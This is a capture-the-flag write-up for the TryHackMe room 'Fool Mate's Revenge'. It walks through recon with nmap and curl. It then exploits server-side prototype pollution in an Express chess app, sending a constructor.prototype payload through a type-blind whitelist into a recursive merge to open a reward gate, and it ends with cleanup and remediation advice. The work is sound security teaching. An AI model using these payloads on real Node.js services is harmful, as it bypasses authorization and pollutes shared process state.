---
description: "TryHackMe Fool Mate's Revenge — Endgame Trainer is a chess mate-in-one puzzle whose move validation moved to the server. Winning the game is easy; the server refuses the prize with a verbose error naming its own gate, session.config.unlocked. The preferences endpoint copies a whitelist of key names but never checks the type of the value, so an object smuggled in under 'theme' reaches a recursive merge. The merge blocks the literal key __proto__ but not constructor, and constructor.prototype walks straight to Object.prototype — server-side prototype pollution in one request. Includes the broken detector that made me wrongly conclude the app was patched, and the isolation table that proves which payload actually worked."
---

# Fool Mate's Revenge — poisoning the referee instead of winning the game

**TryHackMe · challenge: Fool Mate's Revenge · target: `http://10.x.x.x:3000` (the lab IP changes
per lease)**

> **The flag is redacted** here as `THM{[redacted]}`. Everything that teaches stays: every request,
> every payload, the exact key that gets through the filter, the dead ends, and the controls that
> prove each result. The flag string itself teaches nothing — it is just proof you were there, and
> printing it hands the room's answer to the next person instead of letting them earn it.

**The brief**, in the room's own words:

> *I see my client-side defences were no match for you, well done, my apprentice! Let's see if you
> have what it takes to claim your prize.*

Read that carefully, because it is the entire hint. "Client-side" means *in your browser*. In the
previous room the checks ran in JavaScript on your own machine, which means you could simply edit
them. This time those checks have moved to the **server** — a computer you do not control, running
code you cannot edit. Whatever stops you now, you cannot just delete it.

One question to answer: **what is the flag?**

---

## Phase 1 — Recon: what is actually running here?

Recon is the first phase of a penetration test. Before touching anything, find out what exists.

### Prove the connection works first

```bash
ping -c 2 10.x.x.x
```

`ping` sends two tiny "are you there?" packets (`-c 2` means "count: 2") and waits for replies. Two
replies came back. This looks trivial and it is the most-skipped step in this whole write-up.
Here is why it matters: later on, a scan that finds nothing has two possible meanings — *"there is
nothing there"* or *"my packets never arrived"* — and those look **identical**. Proving the
connection now means that every silence later has only one meaning.

### Scan the ports

A **port** is a numbered door on a machine. A computer has 65,535 of them, and each program that
accepts connections from the network sits behind one — web servers usually behind 80 or 443, remote
logins behind 22. Finding which doors are open tells you what the machine offers.

```bash
nmap -Pn -p- --min-rate 2000 -T4 -oN nmap-allports.txt 10.x.x.x
```

`nmap` is the standard port scanner and the tool the PT1 exam expects you to reach for. Flag by flag:

- `-Pn` — "assume the host is up; skip the ping test". By default nmap pings first and skips hosts
  that do not answer. Plenty of firewalls drop pings, so `-Pn` stops nmap from skipping a live box.
- `-p-` — scan **all 65,535 ports**, not nmap's default top 1,000. The room already handed me port
  3000, but a second open door would change the whole shape of the answer, and finding that out
  costs one minute.
- `--min-rate 2000` — send at least 2,000 packets per second. Without it a full sweep can take
  twenty minutes.
- `-T4` — timing template 4, "aggressive". Sensible over a lab VPN. Do not use `-T5` against a
  small lab VM; you can knock it over and end up debugging your own traffic.
- `-oN nmap-allports.txt` — save the human-readable output to a file. Always save scan output. A
  claim you cannot check against a file is not evidence.

Result:

```
22/tcp   open  ssh
3000/tcp open  ppp
```

Two doors. Port 22 is **SSH** (Secure Shell — remote command-line login); irrelevant unless I find
credentials. Port 3000 is the app. Note that nmap labels it "ppp" — that guess comes purely from a
lookup table of port numbers and is **wrong**. A port number is a hint, never an identification.

### Read the response headers

```bash
curl -sS -D headers.txt -o root.html http://10.x.x.x:3000/
```

`curl` fetches a URL from the command line. `-D headers.txt` saves the **response headers** (the
metadata the server sends before the page itself), `-o root.html` saves the page body, and `-sS`
means "quiet, but still show me errors".

```
HTTP/1.1 200 OK
X-Powered-By: Express
Last-Modified: Fri, 19 Jun 2026 14:35:33 GMT
ETag: W/"d78-19ee04efb36"
```

`X-Powered-By: Express` names the software: **Express**, the most common web framework for
**Node.js** — which is JavaScript running on a server instead of in a browser. That one line
matters enormously, because it tells you which family of vulnerabilities is even possible here.
JavaScript-on-the-server has its own signature bug class, and we are going to hit it.

`Last-Modified` and `ETag` mean this response came off disk via Express's static-file server. So:
plain HTML and JavaScript files at the front, an **API** behind them. (An API — Application
Programming Interface — is just a set of URLs that return data instead of a web page, meant to be
called by code rather than clicked by a human.)

---

## Phase 2 — Enumeration: read everything before touching anything

This is the rule that pays for itself more than any other: **read every static file the site serves
before you send it a single command.** Static files are free to read, they cannot break anything,
and the JavaScript that runs your browser page is written by the same developer who wrote the
server — so it documents the API: every URL, every method, every field name.

The page is a chess app called **Endgame Trainer** and it loads exactly one script, `js/app.js`.
Four things in it matter.

### 1. The puzzle is a mate-in-one

```js
const START_FEN = '6k1/5ppp/8/8/8/8/5PPP/R5K1 w - - 0 1';
```

**FEN** (Forsyth–Edwards Notation) is the standard one-line way to write down a chess position.
Decoded: Black has a king on g8 with pawns on f7, g7, h7; White has a rook on a1, a king on g1, and
pawns on f2, g2, h2. The trailing `w` means White moves next.

The black king is walled in by its own three pawns. So White plays the rook all the way up the open
a-file to a8, and the king has no square to run to: **Ra1–a8 is checkmate in one**. Chess players
call this a *back-rank mate*. You do not need to be a chess player to solve the room, but you do
need to spot that the intended win is a single, specific move.

### 2. Moves are checked on the server

```js
res = await fetch('/api/move', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ from, to, promotion: promotion || undefined })
});
```

`fetch` is the browser's built-in function for calling a URL from JavaScript. The browser sends
`{"from": "...", "to": "..."}` to `/api/move` and only redraws the board if the server approves.
The browser is *proposing* moves, not deciding them. Exactly what the room text promised.

### 3. Winning the game is not enough

```js
function finalize(data) {
  if (data.flag) {
    showFlag(data.flag);
  } else if (data.locked) {
    showSystemNotice(data.message || 'Checkmate! Reward is locked for this account.');
  }
}
```

Two branches. The server can answer *"yes, that was checkmate — and no, you do not get the prize."*
There is an entitlement on the account somewhere. Delivering mate is the easy half.

### 4. Something writes to my account

```js
async function savePrefs() {
  const prefs = { theme: ..., pieceSet: ..., animationMs: ... };
  const res = await fetch('/api/settings', { method: 'POST', ..., body: JSON.stringify(prefs) });
}
```

A "save my preferences" endpoint that accepts a JSON object and stores it. **Any endpoint that
takes a structured object from the client and merges it into server-side state is a place to
attack.** Remember this one.

### Check for leftover source code

Developers leave things behind. Worth thirty seconds:

```bash
for p in package.json server.js .git/HEAD js/ vendor/chess.js zzz-control-does-not-exist-9182; do
  echo "$(curl -s -o /dev/null -w '%{http_code}' http://10.x.x.x:3000/$p)  /$p"
done
```

`-w '%{http_code}'` prints just the numeric status (200 = found, 404 = not found) instead of the
page. Note the last two entries — those are **controls**, and they are not optional:

- `/vendor/chess.js` is a **positive control**: a file I already know exists. If my loop reported
  404 for it, my loop is broken.
- `/zzz-control-does-not-exist-9182` is a **negative control**: a path that cannot possibly exist.
  If my loop reported 200 for it, my loop is broken in the other direction.

```
404  /package.json    404  /server.js    404  /.git/HEAD    404  /js/
200  /vendor/chess.js                 ← positive control fired
404  /zzz-control-does-not-exist-9182 ← negative control fired
```

Both controls behaved, so the 404s are real information rather than a broken script. Get in the
habit: **a sweep without controls is a sweep whose result you cannot trust.** No source code
available; everything from here has to come from the app's behaviour.

---

## Phase 3 — Exploitation

### Play the mate and read the refusal

```bash
curl -s -c c.txt http://10.x.x.x:3000/api/state > /dev/null
```

`-c c.txt` saves any cookie the server sets into a file. The server hands out `sid=...`, a session
cookie — the token that tells it which game is mine. `-b c.txt` sends it back on later requests.
Without this every request would be a brand-new game.

```bash
curl -s -b c.txt -H 'Content-Type: application/json' -X POST \
     -d '{"from":"a1","to":"a8"}' http://10.x.x.x:3000/api/move
```

- `-X POST` — use the POST method (sending data) rather than GET (fetching).
- `-H 'Content-Type: application/json'` — tell the server the body is JSON. Leave this out and
  Express will not parse the body at all.
- `-d '{...}'` — the body itself: the mate-in-one, rook a1 to a8.

```json
{"ok":true,"move":"a1a8","status":"checkmate","winner":"white","locked":true,
 "message":"Checkmate! No reward for you.",
 "reason":"reward gate closed: session.config.unlocked is not set"}
```

Checkmate on the first move, and **the server just told me the name of its own lock**:
`session.config.unlocked`.

That verbose `reason` field is itself a genuine vulnerability — an *information disclosure*. A
production app says "access denied" and stops. This one names the exact internal property an
attacker needs to control. Every subsequent step is built on that one sentence.

### Two attempts that failed, and why

**Attempt 1 — mass assignment.** *Mass assignment* is when a server takes the whole JSON object you
send and copies all of it into its own record, so you can set fields the developer never intended
you to touch. The obvious try:

```bash
-d '{"config":{"unlocked":true}}'      →  {"ok":true,"preferences":{}}
```

The `config` key was **dropped**, and the mate stayed locked. The endpoint copies a **whitelist** —
a fixed list of allowed key names (`theme`, `pieceSet`, `animationMs`) — instead of merging
everything. There is a second reason it could never have worked, which only became clear later:
this endpoint writes to `session.preferences`, while the gate reads `session.config`. Different
objects. Even a perfect mass assignment would have filled the wrong bucket.

**Attempt 2 — `__proto__` at the top level.**

```bash
-d '{"__proto__":{"unlocked":true}}'   →  {"ok":true,"preferences":{}}
```

Also dropped. The whitelist runs *first*, and `__proto__` is not on it, so this payload never
reached anything that could act on it.

### The observation that cracked it

The whitelist checks key **names**. Does it check the **type** of the value?

```bash
-d '{"theme":{"a":1},"animationMs":"x"}'
→  {"ok":true,"preferences":{"theme":{"a":1},"animationMs":"x"}}
```

`theme` is meant to be a word like `"forest"`. I sent an **object** and the server stored it
happily. So the filter guards the door but never inspects the parcel.

Is that object merged or replaced? Two requests answer it:

```bash
-d '{"theme":{"a":1}}'   then   -d '{"theme":{"b":2}}'
→  {"ok":true,"preferences":{"theme":{"a":1,"b":2}}}
```

Both keys survive. That is a **recursive merge**: the server walks into nested objects and copies
keys one level at a time, rather than overwriting the whole value. A recursive merge over
attacker-controlled JSON, in Node.js, is the exact recipe for the bug class this room is named
after.

### What prototype pollution actually is

Skip this if you know it; it is the heart of the room if you do not.

In JavaScript, every ordinary object is linked to a shared parent object called
**`Object.prototype`**. When you read a property that an object does not have, JavaScript does not
give up — it looks at the parent:

```js
const config = {};          // an empty object, owns nothing
console.log(config.unlocked);   // undefined — not on config, not on Object.prototype either

Object.prototype.unlocked = true;   // write once, to the shared parent

console.log(config.unlocked);   // true — inherited, though config still owns nothing
```

Nothing was written to `config`. Yet `config.unlocked` now reads `true` — and so does
`anythingElse.unlocked`, for **every object in the entire program**. That is **prototype
pollution**: one write to the shared parent silently changes what every object in the process
appears to contain.

Now look again at the server's refusal: it checks `session.config.unlocked`. It never checks
whether `session.config` genuinely *owns* that property. So I do not need to modify anyone's
session. I need to write to `Object.prototype` once.

The route there runs through the recursive merge. Two well-known paths reach the prototype:

- **`__proto__`** — the classic shortcut. `obj.__proto__` *is* the parent object.
- **`constructor.prototype`** — the long way round. `obj.constructor` is the `Object` function that
  built it, and `Object.prototype` is that same shared parent. Two hops, identical destination.

Most patched code blocks the first and forgets the second.

### The wrong turn that nearly ended the run

I built what I thought was a safe test. Rather than guess the reward property, I would pollute a
setting whose effect I could *see*: Express reads a setting called `json spaces` to decide whether
to pretty-print JSON responses. Pollute it with `10`, and every response should come back indented.
A clean yes/no.

```bash
-d '{"theme":{"__proto__":{"json spaces":10}}}'          → response NOT indented
-d '{"theme":{"constructor":{"prototype":{"json spaces":10}}}}'  → response NOT indented
```

Neither key was stored, neither response changed. I concluded the merge had a denylist covering
both `__proto__` and `constructor`, and that this app was patched.

**That conclusion was wrong, and the `constructor` payload had already polluted `Object.prototype`
at that very moment.** My *detector* was broken, not my *payload* — this Express build simply did
not read `json spaces` from a pollutable object, so a completely successful attack produced a
negative reading. I had built a control that could only ever say "no", and then I believed it.

The rule, and it is worth tattooing somewhere: **a negative result from a detector you have never
seen say "yes" is not a result.** Either prove the detector works, or test against the real
objective. Here the real objective — the reward gate — was one request away the entire time.

### The exploit

Distrust the detector, aim at the gate itself:

```bash
# 1. get a session cookie
curl -s -c c.txt http://10.x.x.x:3000/api/state > /dev/null

# 2. pollute Object.prototype.unlocked through the preferences merge
curl -s -b c.txt -H 'Content-Type: application/json' -X POST \
     -d '{"theme":{"constructor":{"prototype":{"unlocked":true}}}}' \
     http://10.x.x.x:3000/api/settings

# 3. play the mate-in-one
curl -s -b c.txt -H 'Content-Type: application/json' -X POST \
     -d '{"from":"a1","to":"a8"}' \
     http://10.x.x.x:3000/api/move
```

```json
{"ok":true,"move":"a1a8","status":"checkmate","winner":"white",
 "flag":"THM{[redacted]}"}
```

Reading the payload from the outside in: `theme` gets past the whitelist because it is an approved
key name. Its value is an object, which the type-blind merge accepts and recurses into.
`constructor` leads to the `Object` function; `prototype` leads to the shared parent; `unlocked`
is written there. The gate then reads `session.config.unlocked`, finds nothing on the session,
walks up to the polluted parent, and sees `true`.

Never played a legitimate move to earn it. Never touched an account. **I poisoned the referee.**

### Proving which payload actually worked

Three payloads ran in a row before I noticed the flag, so strictly I did not yet know which one did
it. That distinction matters — an exploit you cannot reproduce is a story, not a finding. Prototype
pollution is reversible enough for a clean test: write the same property back as `false` and the
gate shuts again.

| # | Payload | `theme` pre-seeded? | Gate |
|---|---|---|---|
| 1 | `constructor.prototype.unlocked = false` | yes | closed (baseline restored) |
| 2 | `theme.__proto__.unlocked = true` | no | **closed** |
| 3 | `constructor.prototype.unlocked = false` | yes | closed (baseline restored) |
| 4 | `theme.__proto__.unlocked = true` | yes | **closed** |
| 5 | `theme.constructor.prototype.unlocked = true` | **no** | **OPEN → flag** |

So the merge *does* filter the literal key `__proto__` and does *not* filter `constructor` — half
my earlier conclusion was right, and the half that said "therefore this is unexploitable" was the
error. No preparation is needed either: row 5 is a single request against a brand-new session.

### A free detector I walked past

Partway through, the `preferences` echo started returning keys I never sent:

```json
{"ok":true,"preferences":{"theme":{"seed":1,"json spaces":10,"unlocked":true}}}
```

`json spaces` and `unlocked` are not stored on that object — they live on the polluted prototype.
`JSON.stringify` prints only an object's *own* properties, so for those to appear the server must
build its echo with a `for...in` loop, which walks the prototype chain. **The application was
reporting my own pollution back to me in plain sight**, and it was a far better detector than the
one I invented. When an app returns data you did not send, stop and explain it before doing
anything else.

---

## Cleaning up after yourself

Prototype pollution is **process-global**: it is not scoped to my session, and it persists until
the Node process restarts. Every other player on that box inherits it. That makes it something *I
introduced*, so it gets removed:

```bash
curl -s -b c.txt -H 'Content-Type: application/json' -X POST \
     -d '{"theme":{"constructor":{"prototype":{"unlocked":false}}}}' \
     http://10.x.x.x:3000/api/settings
```

Then verify — verification is the point, not the intention:

```json
{"ok":true,"status":"checkmate","locked":true,
 "reason":"reward gate closed: session.config.unlocked is not set"}
```

Gate shut. Be honest about the limit: the polluted property cannot truly be *deleted* through this
endpoint, only set to a falsy value. The gate is closed and the box behaves as it did before, but
only a process restart fully clears it. Say so rather than claiming a clean removal.

---

## What the developer got wrong

Five distinct mistakes, each independently fixable:

1. **A verbose error naming an internal property.** `reason: "session.config.unlocked is not set"`
   handed me the target. Log the detail server-side; return "access denied" to the client.
2. **Whitelisting key names but not value types.** `theme` is supposed to be a short string. One
   line — reject anything that is not a string from a known set — kills the whole chain.
3. **A recursive merge over attacker-controlled JSON.** Use a targeted assignment of the three
   fields, not a generic deep merge. If you must merge, block `__proto__`, `constructor` *and*
   `prototype`, or build the target with `Object.create(null)` so it has no prototype to poison.
4. **Reading an authorisation flag through the prototype chain.** `session.config.unlocked` should
   have been `Object.prototype.hasOwnProperty.call(session.config, 'unlocked')` — an inherited
   property must never satisfy a security check.
5. **Stack traces exposed to the internet.** Malformed JSON returned an Express error page leaking
   the app's path on disk. Setting `NODE_ENV=production` suppresses it.

## What I got wrong

- **I fired at a field name before knowing which object the write endpoint writes to.** The error
  message names the *target*; it does not tell you the *route*.
- **I trusted an unvalidated detector.** The `json spaces` control never demonstrated it could
  report success, so its "no" meant nothing — and it caused me to declare a working exploit
  patched. Prove your instrument can say yes, or test against the objective itself.
- **I explained away an anomaly.** Keys I never sent appeared in the response. That was the answer
  arriving unannounced, and I read past it.

## Method, in one paragraph

Read every static file before sending a single command; the client-side JavaScript documents the
API for free. Put a positive and a negative control in every sweep, in the same run. When an app
refuses you, **read the refusal** — verbose errors name the thing you need to control. Probe the
*type* of a value, not just its name, whenever a filter looks like a whitelist. And when a test
comes back negative, ask whether the instrument could ever have come back positive, because the
most expensive failure in this room was not a payload that did not work — it was a working payload
I threw away on the word of a broken detector.
